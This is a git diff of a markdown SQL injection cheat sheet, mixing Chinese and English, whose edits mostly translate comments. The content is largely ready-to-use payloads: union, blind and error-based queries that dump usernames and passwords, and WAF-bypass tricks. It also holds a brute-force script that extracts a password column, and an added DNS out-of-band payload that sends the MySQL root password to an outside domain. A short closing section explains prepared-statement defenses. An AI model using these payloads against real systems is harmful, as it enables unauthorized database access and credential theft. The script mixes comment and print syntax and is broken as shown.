@@ -16,7 +16,7 @@ SQL is a famous database engine which is used with web server. In this situation
 *  [Tools](#tools)  
 *  [Defense](#defense)  
 *  [Reference](#reference)
-  
+
 ### Basic injection  
 select password from users where name = '$id';  
 So, what can we insert into $id?  
@@ -25,32 +25,32 @@ So, what can we insert into $id?
 5566; drop table hello  // execute drop table on second line  
 
 rafael' or 1=1 --  // select password from users where name = 'rafael' or 1=1 --';  
-rafael' or ''='    // select password from users where name = 'rafael' or ''=''; 
+rafael' or ''='    // select password from users where name = 'rafael' or ''='';
 
-// 繞過長度限制
-'||1#     // 邏輯運算符不需要空白
+// bypass length limit
+'||1#     // logic op dont need space char
 '^0#
 '|0#
 ```  
-  
+
 ### Union based
-1. Vul to SQL injection?   
+1. Vul to SQL injection?  
 ```sql
 1' or 1"  
 ```  
 2. union with **same number** of columns  
 ```sql
-// 不斷增加N的數量, 直到頁面不在正常顯示
+// N+=1, until page cannot show
 1' order by N#
 ```  
 3. make sure where is our injection point?
-```sql 
-//  1,2 數字會出現在注入點上 
+```sql
+//  1,2 number will show on the inj point 
 1' and 1=2 union select 1,2...N#
 ```  
 4. make sure some basic information
 ```sql
-union select user(),database(),version(), @@version_compile_os--+  // 後面兩個分別是資料庫版本以及作業系統版本
+union select user(),database(),version(), @@version_compile_os--+
 ```  
 5. start our exciting point
 ```sql
@@ -58,25 +58,24 @@ union select user(),database(),version(), @@version_compile_os--+  // 後面兩�
 ```  
 ```sql
 ...union select 1,2,...,group_concat(table_name) from information_schema.tables where table_schema='FUCK'+--+  
-// FUCK那邊也可以用hex表示
+// table_schema can also show with hex
 ```
 ```sql
 ...union select 1,2,...,group_concat(column_name) from information_schema.columns where table_name='users'+--+
-// 這邊還是比較喜歡用table_schema,如果懶得決定要鎖定哪張表XD...
+// table_schema would be better:)...
 ```
 ```sql
-// 最終目的
 1' and 1=2 union 1,2,...,group_concat(username,password) from users+--+  
-// 資料全都擠在一起好麻煩
-1' and 1=2 union select 1,group_concat(column_name separator '*') from table_name#    // 每一筆用*隔開
+// separate
+1' and 1=2 union select 1,group_concat(column_name separator '*') from table_name#    // with *
 ```  
 [What's in information_schema.columns?](https://dev.mysql.com/doc/refman/5.7/en/columns-table.html)  
 **group_concat() is also a litte trick.**
 
 ### Blind based  
-結果沒顯示在頁面上，也沒有顯示錯誤訊息的場景下.  
-**True**: 頁面顯示正常.  
-**False**: 頁面顯示異常會空結果.  
+result not show on the page and also no error msg.  
+**True**: show normal.  
+**False**: show error or 0 result.  
 **Boolean based**  
 ```sql
 length(str)
@@ -84,17 +83,17 @@ substr(str,pos,len)   // start index from 1
 mid(str,pos,len)
 ascii(str)    // we will get decimal, ord()
 if(a,b,c)   // if a is true, return b, otherwise return c
-id=1' and ascii(substr((select database()),1,1))>65--+  // 通常ascii介於32~127
-// 靈活的使用語法
+id=1' and ascii(substr((select database()),1,1))>65--+  // ascii from 32~127
+// work with syntax
 and (mid((select group_concat(column_name) from information_schema.columns),1,1) like 'd');
 ```  
-boolean based是由**頁面返回成功與否**來判定...  
+boolean based depends on **whether page show things**...  
 
 **Time based**  
 ```sql
-id=1' and if(ascii(substr((select database()),1,1)>115),0,sleep(5))--+  // if 第一個字非s以後的字母 則延遲5秒
+id=1' and if(ascii(substr((select database()),1,1)>115),0,sleep(5))--+  // if the first char is not bigger than s, then delay 5s
 ```
-Blind-based會花非常多時間，所以可以自己寫script來代替手注!  
+Blind-based costs lot of time，therefore script is necessary!  
 ```python
 #!/usr/bin/env python3
 import re
@@ -103,20 +102,20 @@ from string import digits, ascii_uppercase, ascii_lowercase
 
 target = url
 flag = ''
-label = "<grey>hi:</grey> value1<br/>"                  // label為每一次爆破成功的標誌
-wordlist = digits + ascii_uppercase + ascii_lowercase         // 透過上面引用，可以將數字，字母一次性加入payload
-for i in range(0,100):                                // 確認flag的長度
-    d = {"key1":"value1","key2":" and length(password) like "+str(i)}       // 注入payload通常會要求繞過waf(等號替換成like之類的)
+label = "<grey>hi:</grey> value1<br/>"                  // label show our successful bruteforce
+wordlist = digits + ascii_uppercase + ascii_lowercase        
+for i in range(0,100):                                // Make sure the length of flag
+    d = {"key1":"value1","key2":" and length(password) like "+str(i)}       // bypass waf(replace = with like)
     response = requests.post(target,data=d)
     if label in response.text:
         print "Get length of flag is : " + str(i)
         flag_leng = i
         break
     print d
-for i in range(1, flag_leng+1):                      // mid, substring等index都從1開始
+for i in range(1, flag_leng+1):                      // mid, substring functions have index from 1
     for j in range(40,127):                  // dec(ascii) (,),*,+,..0,1,...A,B,....a,b,c,.....{,|,},~,DEL
         d = {"key1":"value1","key2":" and mid(password," + str(i) + ",1) like '" + chr(j) + "'"}
-                                                       // chr(97) -> 'a' 
+                                                       // chr(97) -> 'a'
         response = requests.post(target,data=d)
         if label in response.text:
            flag += chr(j)
@@ -124,7 +123,14 @@ for i in range(1, flag_leng+1):                      // mid, substring
            break
         print d
 print flag
-```
+```  
+
+**DNS injection**  
+The process of brute force still takes much time. If we inject a domain name in our payload to force it to be parsed, we might get our data efficiently from dns log.  
+MySQL:  
+```php
+select load_file( concat('\\\\', (select password from mysql.user where user='root' limit 1), '.www.example.com\\abc') );
+```  
 
 ### Error based
 * Analyze the error message  
@@ -134,7 +140,7 @@ Error: You have an error in your SQL syntax; check the manual that corresponds t
 ```
 看到**near**和**at**的字眼，我們可以刪除左右的單引號，剩下的sql語句應是: ```'  2'  ') LIMIT 0,1```  
 因此，注入語句應該是: ```') or 1=1--+```  
-* Double injection 
+* Double injection
 ```sql
 /**
 we need:
@@ -180,7 +186,7 @@ Tricks:  
 - I want to login  
   - `id=1' or 1 like 1#`  
   - `') or '1'=1--`  
-- Space bypass  
+- Space bypass 
   - `select/**/username/**/from/**/users;`  
   - `select@{backtick}id{backtick}`(I wrap it with {} due to markdown syntax here)  
   - `union select 1,2` -> `union(select(1),2)`  
@@ -205,7 +211,7 @@ Tricks:  
   - `Char(49)` `Hex('a')` `Unhex(61)`  
   - On asp+iis, server can parse unicode automatically, `%` in url would be ignored, it means `s%u0065lect` would be parsed as select  
   - `IBM037`,`IBM500`,`IBM1026`,`cp875` and so on, take a look at [bypass waf with encoding](#bypass-requestvalidation-on-aspx)  
-- Comment  
+- Comment 
   - `#`    
   - `--+` `--` `-- -`  
   - `/* ... */` `///**/`(multiple lines)  
@@ -227,7 +233,7 @@ Tricks:  
 - Function separator  
   - In fact, there can be someting between func name and left bracket, this can be used to bypass regex  
   - function `/**/`,`%2520`,`%250c`,`%25a0` ()  
-    
+
 More：  
 [seebug我的wafbypass之道](https://paper.seebug.org/218/)  
 
@@ -302,7 +308,7 @@ On Error Resume Next
 If Not Request.QueryString("uid").Contains("'") Then
   ...SELECT name FROM users WHERE uid = Request.QueryString("uid")...
   Response.Write(Query)
-Else 
+Else
   Response.Write("You fail")
 End If
 ```
@@ -321,12 +327,12 @@ Exploit:
 ### Wordpress Double Prepare Misuse  
 Wordpress自己寫了`prepare()`預編譯sql語句然後再`execute()`，有別於PDO下的`prepare()`,`blind()`,`execute()`。這是出現在wordpress4.8.3以前的版本的問題...  
 ```php
-$query = $wpdb->prepare( "SELECT * FROM table WHERE column = %s", $_GET['c1'] ); 
+$query = $wpdb->prepare( "SELECT * FROM table WHERE column = %s", $_GET['c1'] );
 $wpdb->query( $query );
 ```  
 若我注入`1' or '1'='1`，`prepare()`會用單引號將它包起來置入query語句，並且轉譯單引號。`SELECT * FROM table WHERE column = ' 1\' or \'1\'=\'1 '`，無解...但是如果開發者今天這樣寫的話...  
 ```php
-$query = $wpdb->prepare( "SELECT * FROM table WHERE column1 = %s", $_GET['c1'] ); 
+$query = $wpdb->prepare( "SELECT * FROM table WHERE column1 = %s", $_GET['c1'] );
 $query = $wpdb->prepare( $query . " AND column2 = %s", $_GET['c2'] );
 $wpdb->query( $query );
 
@@ -387,11 +393,11 @@ select a from user where id='0';
 2. 語法分析：辨認關鍵字，並以AST做成語法樹  
 3. 檢測內容  
 4. 語意辨識  
-  
+
 語意辨識完了之後就是**選用執行計畫**，最後才執行(一般編譯過後會放入plan cache，這樣下次同樣的語句就不用重編譯，而是重用執行計畫，大部分的注入都是因為我們沒有用原先的執行計畫...)  
 所以說為什麼prepare statement能夠防範注入呢？prepare所進行的是預編譯，這時不會把使用者輸入的值放入資料庫執行，搭配參數化查詢(正確使用)的話，我們就能重用執行計畫並且完美地避免sql注入  
 這邊還要注意`PDO::prepare`的用法，PDO內建一個叫`ATTR_EMULATE_PREPARES`的模擬器，預設情況下是**true**，在PDO的模擬器中完成預處理與參數化查詢，再根據字符集處理後才送給mysql。我們必須把他設為**false**，他才會分兩次傳給mysql執行！
-  
+
 🎅SQLChop可以說防禦了99%的sql注入，因為他對參數執行了詞法語法分析。不管payload再怎樣變化，只要經過sql原生的詞法語法分析後發現多個token，而他是個有效的語句，那就會被偵測到!  
 
 # Reference
